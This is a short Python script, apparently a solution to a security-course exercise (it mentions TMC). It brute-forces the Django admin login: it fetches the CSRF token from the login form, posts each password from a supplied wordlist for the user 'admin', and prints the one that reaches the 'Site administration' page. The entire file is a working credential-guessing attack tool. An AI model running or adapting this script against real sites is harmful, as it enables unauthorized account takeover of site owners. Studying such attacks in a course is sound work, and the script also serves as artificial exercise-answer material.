import sys
import requests
import bs4 as bs


def extract_token(response):
    soup = bs.BeautifulSoup(response.text, 'html.parser')
    for i in soup.form.findChildren('input'):
        if i.get('name') == 'csrfmiddlewaretoken':
            return i.get('value')
    return None


def isloggedin(response):
    soup = bs.BeautifulSoup(response.text, 'html.parser')
    return soup.title.text.startswith('Site administration')


def test_password(address, candidates):
    address = address + "/admin/login/?next=/admin/"
    session = requests.Session()
    token = extract_token(session.get(address))

    data = {}
    data['csrfmiddlewaretoken'] = token
    data['username'] = 'admin'
    data['password'] = ''

    request = requests.Request('POST', address, data=data)

    for guess in candidates:
        data['password'] = guess

        # this is slow, it would be better to
        # prepare the request outside of the loop
        # and modify it inside

        prepped = session.prepare_request(request)
        print(prepped.body)
        if isloggedin(session.send(prepped)):
            return guess

    return None



def main(argv):
    address = sys.argv[1]
    fname = sys.argv[2]
    candidates = [p.strip() for p in open(fname)]
    print(test_password(address, candidates))


# This makes sure the main function is not called immediatedly
# when TMC imports this module
if __name__ == "__main__": 
    if len(sys.argv) != 3:
        print('usage: python %s address filename' % sys.argv[0])
    else:
        main(sys.argv)
